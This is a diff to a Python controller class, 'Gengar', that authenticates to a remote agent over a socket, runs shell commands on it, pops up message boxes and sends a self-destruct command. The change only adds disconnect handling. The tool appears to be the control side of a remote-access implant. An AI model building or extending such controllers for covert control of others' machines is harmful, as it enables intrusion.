@@ -22,6 +22,10 @@ class GengarAuthenticationFailed(Exception):
     pass
 
 
+class GengarDisconnected(Exception):
+    pass
+
+
 @dataclass
 class ShellOutput:
     exit_code: int
@@ -43,34 +47,48 @@ class Gengar:
     def init(self):
         self.username = self.shell('echo %username%').output
 
+    def _send(self, buf: bytes):
+        try:
+            self._sock.send(buf)
+        except ConnectionError:
+            self.alive = False
+            raise GengarDisconnected from None
+
+    def _recv(self, bufsize: int):
+        try:
+            return self._sock.recv(bufsize)
+        except ConnectionError:
+            self.alive = False
+            raise GengarDisconnected from None
+
     def echo(self, text: str):
-        self._sock.send(struct.pack('I', CommandTypes.ECHO) + struct.pack('I', len(text)) + text.encode())
-        output = self._sock.recv(len(text)).decode()
+        self._send(struct.pack('I', CommandTypes.ECHO) + struct.pack('I', len(text)) + text.encode())
+        output = self._recv(len(text)).decode()
         return output
 
     def shell(self, cmd: str):
         output = b''
-        self._sock.send(struct.pack('I', CommandTypes.SHELL) + struct.pack('I', len(cmd)) + cmd.encode())
-        exit_code = struct.unpack('i', self._sock.recv(INT_SIZE))[0]
+        self._send(struct.pack('I', CommandTypes.SHELL) + struct.pack('I', len(cmd)) + cmd.encode())
+        exit_code = struct.unpack('i', self._recv(INT_SIZE))[0]
         if exit_code == -1:
             logger.error('Gengar failed to execute the shell command.')
             return
         while True:
-            output_size = struct.unpack('I', self._sock.recv(INT_SIZE))[0]
+            output_size = struct.unpack('I', self._recv(INT_SIZE))[0]
             if not output_size:
                 break
-            output += self._sock.recv(output_size)
+            output += self._recv(output_size)
         try:
             return ShellOutput(exit_code, output.decode().strip())
         except UnicodeDecodeError:
             return ShellOutput(exit_code, output)
 
     def msgbox(self, title: str, text: str):
-        self._sock.send(struct.pack('I', CommandTypes.MSGBOX) + struct.pack('I', len(title)) +
-                        title.encode() + struct.pack('I', len(text)) + text.encode())
+        self._send(struct.pack('I', CommandTypes.MSGBOX) + struct.pack('I', len(title)) +
+                   title.encode() + struct.pack('I', len(text)) + text.encode())
 
     def suicide(self):
-        self._sock.send(struct.pack('I', CommandTypes.SUICIDE))
+        self._send(struct.pack('I', CommandTypes.SUICIDE))
         self._sock.close()
         self.alive = False
 
@@ -84,10 +102,10 @@ class Gengar:
 
         try:
             self._sock.settimeout(5)
-            received_auth_key = self._sock.recv(len(AUTH_KEY_FROM_GENGAR))
+            received_auth_key = self._recv(len(AUTH_KEY_FROM_GENGAR))
             if received_auth_key != AUTH_KEY_FROM_GENGAR:
                 raise GengarAuthenticationFailed
-            self._sock.send(AUTH_KEY_TO_GENGAR)
+            self._send(AUTH_KEY_TO_GENGAR)
             self._authenticated = True
         except socket.timeout:
             raise GengarAuthenticationFailed
